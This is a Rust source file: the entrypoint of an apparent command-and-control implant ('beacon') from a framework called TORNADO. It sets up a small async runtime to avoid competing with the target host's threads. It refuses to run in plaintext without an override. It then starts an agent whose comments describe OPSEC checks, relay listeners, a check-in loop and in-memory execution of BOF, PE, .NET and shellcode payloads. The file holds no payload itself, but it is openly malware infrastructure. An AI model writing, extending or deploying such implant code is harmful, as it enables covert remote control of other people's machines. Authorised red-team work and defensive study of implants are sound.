//! Beacon binary entrypoint.
//!
//! Replaces `stageless/main.go`. Constructs the runtime `Config`
//! from the build-time constants and calls `run_agent`, which is
//! the `Main(cfg)` replacement: worker-mode short-circuit, OPSEC
//! checks, `new_agent`, relay-listener setup, and `Agent::run`.
//!
//! The binary carries no runtime configuration surface — every
//! value was set at `beacon-build` time. The one environment
//! variable this file reads (`TORNADO_ALLOW_PLAINTEXT`) is a
//! development override for the safety check below. It does not
//! change the beacon's wire shape, schedule, or transports; it
//! only suppresses a startup refusal.
//!
//! # Why no `#[tokio::main]`
//!
//! The plaintext check completes before the runtime is created —
//! it is a cheap invariant on the build-time constants, and there
//! is no reason to pay for a tokio runtime just to print an error
//! and exit. The manual `Runtime::new().block_on()` construction
//! is the same shape `lib.rs::DllMain` and `bin/stager.rs` use, so
//! all three entry points look alike.

use std::process::ExitCode;

use agent::config;
use agent::core::agent::{run_agent, Config};

fn main() -> ExitCode {
    // -----------------------------------------------------------------
    // Plaintext safety check.
    //
    // A build with no embedded ECDH public key speaks plaintext on
    // the wire: the wire envelope is skipped, and a passive
    // observer reads task JSON in the clear. Refuse to start
    // unless the operator opted in.
    //
    // The override exists so a developer testing a local build
    // against a plaintext listener is not forced to generate a
    // server key. A deployed beacon never sets it.
    if config::SERVER_ECDH_PUBKEY_B64.is_empty()
        && std::env::var_os("TORNADO_ALLOW_PLAINTEXT").is_none()
    {
        eprintln!(
            "[agent] SERVER_ECDH_PUBKEY_B64 is empty — this agent \
             will speak plaintext. Set TORNADO_ALLOW_PLAINTEXT=1 \
             to override."
        );
        return ExitCode::FAILURE;
    }

    // -----------------------------------------------------------------
    // Runtime setup.
    //
    // Same worker / blocking thread configuration as
    // `bin/stager.rs` and `DllMain`: the beacon's workload is one
    // async loop plus occasional blocking work (BOF, PE, .NET,
    // shellcode). Two async workers is enough; the default of
    // `num_cpus` threads competes with the host's own threads on
    // a busy target.
    let rt = match tokio::runtime::Builder::new_multi_thread()
        .worker_threads(2)
        .max_blocking_threads(8)
        .enable_all()
        .thread_name("beacon")
        .build()
    {
        Ok(rt) => rt,
        Err(e) => {
            eprintln!("[agent] tokio runtime init failed: {e}");
            return ExitCode::FAILURE;
        }
    };

    // -----------------------------------------------------------------
    // Run the agent.
    //
    // `run_agent` performs the worker-mode check first. A beacon
    // launched as an `execute-assembly` worker never enters this
    // runtime's loop; it runs the .NET loader and exits with the
    // loader's status. A normal beacon runs the OPSEC prelude,
    // constructs the `Agent`, starts any relay listeners, and
    // enters the check-in loop.
    let cfg = Config::from_consts();

    match rt.block_on(run_agent(cfg)) {
        Ok(()) => ExitCode::SUCCESS,
        Err(e) => {
            eprintln!("[agent] run loop exited with error: {e}");
            ExitCode::FAILURE
        }
    }
}